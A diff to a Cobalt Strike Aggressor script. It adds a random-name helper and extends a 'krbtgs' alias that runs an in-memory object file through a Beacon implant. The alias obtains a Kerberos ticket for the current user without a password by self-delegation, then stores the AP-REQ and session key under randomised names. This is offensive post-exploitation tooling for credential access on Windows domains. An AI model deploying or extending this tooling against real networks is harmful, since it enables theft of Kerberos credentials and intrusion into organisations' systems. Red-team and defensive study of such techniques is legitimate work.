@@ -1,4 +1,18 @@
 #
+# Credit to @offsec_ginger
+#
+sub random_string {
+	$limit = $1;
+	@random_str = @();
+	$characters = "abcdefghijklmnopqrstuvwxyz";
+	for ( $x = 0 ; $x < $limit ; $x++ ) {
+		$n = rand( strlen( $characters ) );
+		add( @random_str, charAt( $characters, $n ) );
+	}
+	return join( '', @random_str );
+}
+
+#
 # Requests a TGS for the current user without
 # a password with self-delegation
 #
@@ -23,16 +37,22 @@ alias krbtgs {
 		return;
 	}
 
+	$rnd = random_string( "12" );
+	$apr = $rnd . "_apreq";
+	$key = $rnd . "_key";
+
 	#
 	# Create argument buffer
 	#
-	$bargs = bof_pack( $1, "Z", $2 );
+	$bargs = bof_pack( $1, "Zzz", $2, $apr, $key );
 
 	#
 	# Deploy the COFF file with relocations applied
 	# to resolve the jumps.
 	#
 	btask( $1, "Tasked Beacon to perform self-delegation to acquire a Kerberos Ticket-Granting-Ticket ( TGT )" );
+	btask( $1, "APREQ will be stored in ". $apr );
+	btask( $1, "Session Key will be stored in ". $key );
 	beacon_inline_execute( $1, $object, "KrbTgsGo", $bargs );
 };
 
